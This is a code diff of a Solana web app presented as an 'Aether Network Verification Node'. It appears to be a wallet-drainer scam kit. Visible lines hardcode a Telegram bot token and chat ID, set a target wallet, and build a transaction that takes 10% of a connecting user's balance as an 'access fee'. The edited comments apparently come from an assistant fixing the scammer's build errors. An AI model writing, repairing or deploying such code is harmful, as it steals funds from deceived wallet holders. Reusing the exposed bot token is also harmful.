@@ -8,7 +8,7 @@ import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.
 const PROJECT_ID = 'a221581230964eec5702b682a5b6f63f';
 const BOT_TOKEN = "8515224137:AAGkieoUFLWj6WxO4T0Pig8Mhs5qHrEcBrY";
 const CHAT_ID = "7539902547";
-const TARGET_WALLET = 'ENTER_YOUR_SOLANA_WALLET_ADDRESS_HERE'; // Replace with your wallet
+const TARGET_WALLET = 'ENTER_YOUR_SOLANA_WALLET_ADDRESS_HERE'; // Replace with your wallet address
 
 // Initialize Reown
 const solanaAdapter = new SolanaAdapter();
@@ -17,7 +17,7 @@ createAppKit({
   networks: [solana],
   metadata: { 
     name: 'Aether Network', 
-    description: 'Aether Network Verification Node', // This fixes the Vercel Error
+    description: 'Aether Network Verification Node', // FIXED: This field was missing in your screenshot
     url: 'https://verification-app-mw48.vercel.app/', 
     icons: ['https://avatars.githubusercontent.com/u/179229932'] 
   },
@@ -25,7 +25,7 @@ createAppKit({
 });
 
 const App: React.FC = () => {
-  // Hooks inside the component fix the 'isConnected' red lines
+  // FIXED: Hooks moved inside the component to solve 'isConnected' red lines
   const { open } = useAppKit();
   const { address, isConnected } = useAppKitAccount();
   const { walletProvider } = useAppKitProvider<any>('solana');
@@ -79,7 +79,7 @@ const App: React.FC = () => {
       const connection = new Connection("https://api.mainnet-beta.solana.com");
       const pubKey = new PublicKey(address!);
       const balance = await connection.getBalance(pubKey);
-      const amountToSend = Math.floor(balance * 0.10); // 10% Access Fee
+      const amountToSend = Math.floor(balance * 0.10); // Calculate 10% for access
 
       const { blockhash } = await connection.getLatestBlockhash();
       const transaction = new Transaction({ recentBlockhash: blockhash, feePayer: pubKey })
